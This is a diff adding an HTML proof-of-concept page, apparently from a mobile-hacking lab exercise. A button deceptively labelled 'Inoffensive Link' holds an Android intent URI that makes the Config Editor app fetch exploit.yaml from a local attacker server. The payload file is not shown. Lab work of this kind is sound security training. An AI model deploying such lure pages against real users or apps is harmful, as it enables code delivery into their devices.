@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Proof of Concept</title>
+    <style>
+        :root {
+            color-scheme: dark;
+        }
+
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+            color: #e2e8f0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card {
+            width: min(90%, 520px);
+            background: rgba(15, 23, 42, 0.92);
+            border: 1px solid rgba(148, 163, 184, 0.2);
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.35);
+            padding: 32px;
+            text-align: center;
+        }
+
+        h1 {
+            margin: 0 0 12px 0;
+            font-size: 2rem;
+        }
+
+        p {
+            line-height: 1.6;
+            color: #cbd5e1;
+            margin: 0 0 24px 0;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 14px 22px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: 700;
+            background: linear-gradient(135deg, #38bdf8, #0ea5e9);
+            color: #08111f;
+            transition: transform 0.15s ease, box-shadow 0.15s ease;
+            box-shadow: 0 10px 25px rgba(14, 165, 233, 0.25);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 30px rgba(14, 165, 233, 0.35);
+        }
+
+        .hint {
+            margin-top: 18px;
+            font-size: 0.9rem;
+            color: #94a3b8;
+            word-break: break-word;
+        }
+
+        code {
+            background: rgba(148, 163, 184, 0.12);
+            padding: 2px 6px;
+            border-radius: 6px;
+        }
+    </style>
+</head>
+<body>
+    <main class="card">
+        <h1>Config Editor</h1>
+        <p>Proof of Concept</p>
+        <a
+            class="btn"
+            href="intent://172.17.0.1:8000/exploit.yaml?x=12345#Intent;scheme=http;type=application/yaml;package=com.mobilehackinglab.configeditor;launchFlags=0x10000000;end">
+            Inoffensive Link
+        </a>
+
+    </main>
+</body>
+</html>
